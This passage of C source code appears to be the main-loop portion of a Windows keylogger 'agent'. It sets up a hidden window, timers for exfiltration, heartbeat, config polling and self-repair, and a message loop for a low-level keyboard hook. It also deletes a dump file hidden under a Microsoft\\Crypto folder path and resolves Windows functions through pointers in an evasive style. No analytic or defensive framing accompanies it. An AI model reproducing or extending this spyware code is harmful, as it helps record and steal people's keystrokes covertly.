    /* --- create hidden window for timers --- */
    HWND hwnd = create_hidden_window(hInstance);
    if (!hwnd) {
        log_write("fatal: failed to create message window");
        hook_uninstall();
        return 1;
    }
    g_hwnd = hwnd;

    /* set up periodic timers */
    pSetTimer(hwnd, TIMER_EXFIL, g_exfil_interval_sec * 1000, NULL);
    pSetTimer(hwnd, TIMER_HEARTBEAT, g_heartbeat_interval_sec * 1000, NULL);
    pSetTimer(hwnd, TIMER_CONFIG_POLL, g_config_poll_interval_sec * 1000, NULL);
    pSetTimer(hwnd, TIMER_REPAIR, REPAIR_INTERVAL_MS, NULL);

    /* hook + message window confirmed — safe to consume the shutdown dump */
    {
        char dump_path[MAX_PATH];
        char appdata[MAX_PATH];
        if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
            snprintf(dump_path, MAX_PATH,
                     "%s\\Microsoft\\Crypto\\shutdown.dump", appdata);
            DeleteFileA(dump_path);
        }
    }

    log_write("agent: entering message loop");

    /* --- message loop (required for WH_KEYBOARD_LL) --- */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        pTranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    /* --- cleanup --- */
    pKillTimer(hwnd, TIMER_EXFIL);
    pKillTimer(hwnd, TIMER_HEARTBEAT);
    pKillTimer(hwnd, TIMER_CONFIG_POLL);
    pKillTimer(hwnd, TIMER_REPAIR);
    pDestroyWindow(hwnd);
    hook_uninstall();
    DeleteCriticalSection(&g_buffer_cs);

    log_write("agent: shutting down");
    return 0;
}
